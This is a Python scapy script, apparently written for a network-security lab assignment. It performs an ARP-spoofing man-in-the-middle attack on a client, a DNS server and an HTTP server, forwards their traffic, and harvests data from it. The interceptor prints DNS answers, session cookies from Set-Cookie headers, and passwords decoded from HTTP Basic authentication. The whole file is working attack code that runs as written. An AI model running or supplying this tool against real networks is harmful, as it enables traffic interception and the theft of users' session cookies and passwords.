from scapy.all import *

import argparse
import sys
import threading
import time
import base64

#python3 arpSpoof.py -i eth0 --clientIP 10.4.22.145 --dnsIP 10.4.22.231 --httpIP 10.4.22.125

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# Finish: returns the mac address for an IP
def mac(IP):
    result = sr1( ARP(op = 1, pdst = IP),verbose=False )
    return result.hwsrc


#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) #  Spoof httpServer ARP table
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) #  Spoof client ARP table
        spoof(clientIP, attackerMAC,dnsServerIP, dnsServerMAC) #  Spoof dnsServer ARP table
        time.sleep(interval)


# spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    send( ARP( op=2, psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC ) )



# restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    spoof(srcIP, srcMAC, dstIP, dstMAC)



    

# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC

    # forward packet
    mac_map = {clientIP:clientMAC, httpServerIP:httpServerMAC, dnsServerIP:dnsServerMAC}
    if packet.src == attackerMAC: 
        return
    if packet.haslayer(IP):
        # print(packet[IP].src)
        packet.src = attackerMAC
        packet.dst = mac_map.get(packet[IP].dst, packet.dst)
        ipsrc = packet[IP].src
        ipdst = packet[IP].dst
        sendp(packet)
    else:
        return
    
    ip_packet = packet[IP]
    if DNS in ip_packet:
        if ip_packet[DNS].an is not None:
            hostname = ip_packet[DNS].an.rrname.decode("utf-8") 
            hostaddr = ip_packet[DNS].an.rdata
            print('*hostname :',hostname)
            print('*hostaddr :',hostaddr)
            
    if TCP in ip_packet:
        tcp_packet = ip_packet[TCP]
        if tcp_packet.payload:
            # sent by the web server to the client? get session cookie
            if ip_packet.src == httpServerIP and ip_packet.dst == clientIP and tcp_packet.sport==80 :
                payload = bytes(tcp_packet.payload).decode("utf-8") 
                if "Set-Cookie" in payload:
                    cookie_arr = payload.split('Set-Cookie:')
                    session = cookie_arr[1].split('\r\n')[0]
                    print('*cookie :', session)

            # sent from client to web server? get the basic auth password
            if ip_packet.src == clientIP and ip_packet.dst == httpServerIP and tcp_packet.dport==80:
                payload = bytes(tcp_packet.payload).decode("utf-8")
                if "Authorization" in payload:
                    auth_arr = payload.split('Basic ')
                    pw = auth_arr[1].split('\r\n')[0]
                    auth = base64.b64decode(pw).decode('utf-8').split(':')[1]
                    print('*basicauth :', auth)


if __name__ == "__main__":
    
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    
    conf.iface = args.interface # set default interface

    # initialize variables
    
    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)
    

    # try to get mac given ip
    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
